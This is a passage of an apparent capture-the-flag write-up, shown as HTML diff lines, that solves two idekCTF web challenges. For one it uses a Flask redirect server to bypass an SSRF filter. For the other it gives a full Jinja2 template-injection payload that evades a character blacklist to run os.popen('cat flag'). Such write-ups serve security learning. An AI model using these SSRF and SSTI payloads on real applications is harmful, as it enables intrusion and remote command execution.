+        <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token boolean">false</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> valid<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">diffURLs</span><span class="token punctuation">(</span><span class="token parameter">urls</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">{</span>
+                <span class="token keyword">const</span> pageOne <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>urls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">{</span><span class="token keyword">return</span> r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">const</span> pageTwo <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>urls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">{</span><span class="token keyword">return</span> r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> Diff<span class="token punctuation">.</span><span class="token function">diffLines</span><span class="token punctuation">(</span>pageOne<span class="token punctuation">,</span> pageTwo<span class="token punctuation">)</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token string">'error!'</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress <span class="token operator">==</span> <span class="token string">'::1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">}</span>
+        <span class="token keyword">else</span><span class="token punctuation">{</span>
+                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Forbidden"</span><span class="token punctuation">,</span> <span class="token number">503</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/diff'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        <span class="token keyword">let</span> <span class="token punctuation">{</span> url1<span class="token punctuation">,</span> url2 <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> url1 <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> url2 <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'Invalid format received'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> urls <span class="token operator">=</span> <span class="token punctuation">[</span>url1<span class="token punctuation">,</span> url2<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span>url <span class="token keyword">of</span> urls<span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">const</span> valid <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">validifyURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>valid<span class="token punctuation">)</span><span class="token punctuation">{</span>
+                        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Request to </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> was denied</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> difference <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">diffURLs</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'diff'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+                <span class="token literal-property property">lines</span><span class="token operator">:</span> difference
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">App listening at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
+<p>It’s immediately obvious that the goal is accessing <code class="language-text">/flag</code>. But how can this be done with the ssrf filter?</p>
+<p>The issue with the application is that <code class="language-text">validifyURL</code> and <code class="language-text">diffURLs</code> each make their own requests to the given links. This is an issue because there is no guarantee that the same link provides the same response to both functions.</p>
+<p>The solution here is hosting a server which alternates between providing an innocent response, and a redirect to <code class="language-text">http://localhost:1337/flag</code>.</p>
+<p>My exploit is as follows:</p>
+<div class="gatsby-highlight" data-language="py"><pre class="language-py"><code class="language-py"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect
+<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread
+<span class="token keyword">import</span> requests
+
+local_url <span class="token operator">=</span> <span class="token string">"&lt;the_url_of_this_server>"</span>
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+reqCounter <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> reqCounter
+    <span class="token keyword">if</span> reqCounter <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        reqCounter <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">return</span> <span class="token string">'hey'</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        reqCounter <span class="token operator">-=</span> <span class="token number">1</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'http://localhost:1337/flag'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">start_server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">4444</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">send_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string">"http://localhost:1337/diff"</span>
+    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"url1"</span><span class="token punctuation">:</span> local_url<span class="token punctuation">,</span> <span class="token string">"url2"</span><span class="token punctuation">:</span> <span class="token string">"http://google.com"</span><span class="token punctuation">}</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_server<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment">#Thread(target=send_payload).start()</span></code></pre></div>
+<p>Upon hosting the server and inputting the url, we see the flag in the diff response:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/9720180ed148c94f6a08e2ebd3d3ee67/4352a/diff-flag.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 10.126582278481013%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAWklEQVQI12P4//f//z//QSQy+vPv/fM3H1+8/fTq3btnr/79+YeuAIwYbl/cdOHw3Munl146vRRCXjq99OKpJacOzz1zdMGZo/NPH5kHEjwFlwIzTi25dn4NAF0ZZ6YFniK1AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="diff flag"
+        title="diff flag"
+        src="/static/9720180ed148c94f6a08e2ebd3d3ee67/f058b/diff-flag.png"
+        srcset="/static/9720180ed148c94f6a08e2ebd3d3ee67/c26ae/diff-flag.png 158w,
+/static/9720180ed148c94f6a08e2ebd3d3ee67/6bdcf/diff-flag.png 315w,
+/static/9720180ed148c94f6a08e2ebd3d3ee67/f058b/diff-flag.png 630w,
+/static/9720180ed148c94f6a08e2ebd3d3ee67/40601/diff-flag.png 945w,
+/static/9720180ed148c94f6a08e2ebd3d3ee67/78612/diff-flag.png 1260w,
+/static/9720180ed148c94f6a08e2ebd3d3ee67/4352a/diff-flag.png 1364w"
+        sizes="(max-width: 630px) 100vw, 630px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<hr>
+<h1 id="jinjail" style="position:relative;"><a href="#jinjail" aria-label="jinjail permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>jinjail</h1>
+<p>As the name implies, this challenge involved jinja2 SSTI with a relatively restrictive filter.</p>
+<div class="gatsby-highlight" data-language="py"><pre class="language-py"><code class="language-py"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> request
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+blacklist <span class="token operator">=</span> <span class="token punctuation">[</span> 
+    <span class="token string">'request'</span><span class="token punctuation">,</span>
+    <span class="token string">'config'</span><span class="token punctuation">,</span>
+    <span class="token string">'self'</span><span class="token punctuation">,</span>
+    <span class="token string">'class'</span><span class="token punctuation">,</span>
+    <span class="token string">'flag'</span><span class="token punctuation">,</span>
+    <span class="token string">'0'</span><span class="token punctuation">,</span>
+    <span class="token string">'1'</span><span class="token punctuation">,</span>
+    <span class="token string">'2'</span><span class="token punctuation">,</span>
+    <span class="token string">'3'</span><span class="token punctuation">,</span>
+    <span class="token string">'4'</span><span class="token punctuation">,</span>
+    <span class="token string">'5'</span><span class="token punctuation">,</span>
+    <span class="token string">'6'</span><span class="token punctuation">,</span>
+    <span class="token string">'7'</span><span class="token punctuation">,</span>
+    <span class="token string">'8'</span><span class="token punctuation">,</span>
+    <span class="token string">'9'</span><span class="token punctuation">,</span>
+    <span class="token string">'"'</span><span class="token punctuation">,</span>
+    <span class="token string">'\''</span><span class="token punctuation">,</span>
+    <span class="token string">'.'</span><span class="token punctuation">,</span>
+    <span class="token string">'\\'</span><span class="token punctuation">,</span>
+    <span class="token string">'`'</span><span class="token punctuation">,</span>
+    <span class="token string">'%'</span><span class="token punctuation">,</span>
+    <span class="token string">'#'</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span>
+
+error_page <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+        {% extends "layout.html" %}
+        {% block body %}
+        &lt;center>
+           &lt;section class="section">
+              &lt;div class="container">
+                 &lt;h1 class="title">Error :(&lt;/h1>
+                 &lt;p>Your request was blocked. Please try again!&lt;/p>
+              &lt;/div>
+           &lt;/section>
+        &lt;/center>
+        {% endblock %}
+        '''</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>error_page<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>error_page<span class="token punctuation">)</span>
+
+        query <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'{'</span> <span class="token keyword">in</span> query <span class="token keyword">and</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>bad <span class="token keyword">in</span> query <span class="token keyword">for</span> bad <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>error_page<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>error_page<span class="token punctuation">)</span>
+
+        page <span class="token operator">=</span> \
+            <span class="token triple-quoted-string string">'''
+        {{% extends "layout.html" %}}
+        {{% block body %}}
+        &lt;center>
+           &lt;section class="section">
+              &lt;div class="container">
+                 &lt;h1 class="title">You have entered the raffle!&lt;/h1>
+                 &lt;ul class=flashes>
+                    &lt;label>Hey {}! We have received your entry! Good luck!&lt;/label>
+                 &lt;/ul>
+                 &lt;/br>
+              &lt;/div>
+           &lt;/section>
+        &lt;/center>
+        {{% endblock %}}
+        '''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>
+
+    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
+        page <span class="token operator">=</span> \
+            <span class="token triple-quoted-string string">'''
+        {% extends "layout.html" %}
+        {% block body %}
+        &lt;center>
+            &lt;section class="section">
+              &lt;div class="container">
+                 &lt;h1 class="title">Welcome to the idekCTF raffle!&lt;/h1>
+                 &lt;p>Enter your name below for a chance to win!&lt;/p>
+                 &lt;form action='/' method='POST' align='center'>
+                    &lt;p>&lt;input name='q' style='text-align: center;' type='text' placeholder='your name' />&lt;/p>
+                    &lt;p>&lt;input value='Submit' style='text-align: center;' type='submit' />&lt;/p>
+                 &lt;/form>
+              &lt;/div>
+           &lt;/section>
+        &lt;/center>
+        {% endblock %}
+        '''</span>
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>page<span class="token punctuation">)</span>
+
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
+</code></pre></div>
+<p>There are two things to note from the source: the blacklisted characters, and the length limit.</p>
+<p>A standard payload for exploiting jinja2 SSTI for RCE is <code class="language-text">lipsum.__globals__.os.popen('cat flag').read()</code>. This payload is blocked as it contains both <code class="language-text">.</code> and <code class="language-text">'</code>. An alternative to using <code class="language-text">.</code> to access attributes is using <code class="language-text">[]</code>, as in <code class="language-text">lipsum["__globals__"]</code>, but how can we create a <code class="language-text">__globals__</code> string without quotation marks or access to <code class="language-text">request</code>, <code class="language-text">self</code>, or <code class="language-text">config</code>?</p>
+<p>Jinja2 has many useful <a href="https://tedboy.github.io/jinja2/templ14.html">filters</a> and <a href="https://tedboy.github.io/jinja2/templ16.html">functions</a> which can be used to modify data. The most useful for our purposes are the <code class="language-text">dict</code> function, and <code class="language-text">list</code> filter.</p>
+<p>Why are these useful? For the ability to create strings out of thin air. We can create a dict without using any strings: <code class="language-text">{{dict(foo=bar)}}</code>. Then, we can convert the dict to a list: <code class="language-text">{{dict(foo=bar)|list}}</code>.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 457px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/3dc3c26f6732954720a52ee55d5a1e35/34f1d/list.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 27.21518987341772%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAwElEQVQY05WOQQvCMAyF/f//Zp522cGKh1WxKpXtqoPWpsOmCnadttN1gmc/SAjv5ZHMhj+JMcQYp3k2DANjW7reMMZoWVJa7vaHqqpXS7Igy1GktCgKQkhd15zzLJvneX7k/PkKY9haK4RQoLSGpmmklG3bSilOp7NSIITQGiZRg1YKLlICwPdyjLEb8VN7OOd914/4zrn+2fc+WQnnOu/97+0QgjFovpWaRWtviGiuV0S8328G0SYrrWAI4RN+AwaQFrC/WBHyAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="list"
+        title="list"
+        src="/static/3dc3c26f6732954720a52ee55d5a1e35/34f1d/list.png"
+        srcset="/static/3dc3c26f6732954720a52ee55d5a1e35/c26ae/list.png 158w,
+/static/3dc3c26f6732954720a52ee55d5a1e35/6bdcf/list.png 315w,
+/static/3dc3c26f6732954720a52ee55d5a1e35/34f1d/list.png 457w"
+        sizes="(max-width: 457px) 100vw, 457px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>We now have an array of the string <code class="language-text">foo</code>. Next, we just need to access the first element of the array, and we have successfully created a string! How can we do this without access to [0-9]? In python, <code class="language-text">False == 0</code>, and <code class="language-text">True == 1</code>, so our final payload for creating a string is <code class="language-text">{{(dict(foo=bar)|list)[False]}}</code>. Also to note, a similar (and shorter) method of accessing the first element is using the <code class="language-text">|last</code> or <code class="language-text">|first</code> filters: <code class="language-text">{{dict(foo=bar)|list|last}}</code>.</p>
+<p>With this knowledge, we can begin crafting an equivalent payload to <code class="language-text">{{lipsum.__globals__.os.popen('cat flag').read()</code>.</p>
+<p>However, there is one more hurdle: if we can’t to execute the command <code class="language-text">cat flag</code>, we will need a space in our string. How can we get a space in our string if we’re unable to create a dictionary key with a space? More filters! One useful filter is <code class="language-text">|center</code>. If we <code class="language-text">|center</code> a string, it will add spaces around it. To create the string <code class="language-text">cat flag</code>, we can use the following payload : <code class="language-text">{{[(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join}}</code> (which also uses <code class="language-text">|reverse</code> to bypass the <code class="language-text">flag</code> blacklist).</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 461px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/4a35587ba1bbf442a5e8534e8a23615b/f816d/jinjail-cat-flag.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 24.68354430379747%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1klEQVQY0z2N207DMBBE8/8fAry2hNBKqKlURUQoohItvxGvHa+9u4690PRyHkbzMKNTqaqI5Jy1FGbWO6WUnPM1hYWISymqykwAUBYqVf09/zRNczx+t2272Wy7rhuGYdfu35u3vv9cv9bDV79arQ+H7nw6vTw/1XX9sds7a6urhIhipDkl9J4XiJiIhDmEeJGLxBjnOTFzzjmEeDOnlAyYyftxHAFgNMZamCbnJmcMuAfWgrUAxoIlIlW9mXHBe++cCyEg4iWXgt4jYozxsUFEEfk//wE2eRa/ZeCNugAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="jinjail rce string"
+        title="jinjail rce string"
+        src="/static/4a35587ba1bbf442a5e8534e8a23615b/f816d/jinjail-cat-flag.png"
+        srcset="/static/4a35587ba1bbf442a5e8534e8a23615b/c26ae/jinjail-cat-flag.png 158w,
+/static/4a35587ba1bbf442a5e8534e8a23615b/6bdcf/jinjail-cat-flag.png 315w,
+/static/4a35587ba1bbf442a5e8534e8a23615b/f816d/jinjail-cat-flag.png 461w"
+        sizes="(max-width: 461px) 100vw, 461px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>Putting it all together, we reach the following payload:</p>
+<div class="gatsby-highlight" data-language="jinja2"><pre class="language-jinja2"><code class="language-jinja2"><span class="token jinja2 language-jinja2"><span class="token delimiter punctuation">{{</span><span class="token variable">lipsum</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">__globals__</span><span class="token operator">=</span><span class="token variable">x</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">os</span><span class="token operator">=</span><span class="token variable">x</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">popen</span><span class="token operator">=</span><span class="token variable">x</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">cat</span><span class="token operator">=</span><span class="token variable">x</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token filter function">center</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">galf</span><span class="token operator">=</span><span class="token variable">x</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token filter function">reverse</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">daer</span><span class="token operator">=</span><span class="token variable">x</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token filter function">reverse</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span></code></pre></div>
+<p>Upon submission, we see the flag:</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 506px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/8cbc8445507766b01e8060f08d66e763/29f4e/jinjail-flag.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 22.78481012658228%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1ElEQVQY042LwU6DQBBA+f/vsQeM8UBiUdk20guJjQtl1guEmdm2uwN0uzWoB4++0zu8l8R4u17j7d+EEGL87RPv3WajiqJ43++zLFOqqKqqLMun9fptu1VK5Xm+25VpmrZgXl+eV6u7+4fHujksc4zRWqu1tpbrugaArusAwBjzaUzbQgvAzFp/4ICHpsFhAGMQaZnPZycizjlm9t4fTyfvvYhM0xRCuFzmeZ5FJIQwjuPiXuZp+mkSZibCvu8HxG+n44IlImstM+OATMR/IEQi8iJfuTYVZZ5GeOcAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="jinjail flag"
+        title="jinjail flag"
+        src="/static/8cbc8445507766b01e8060f08d66e763/29f4e/jinjail-flag.png"
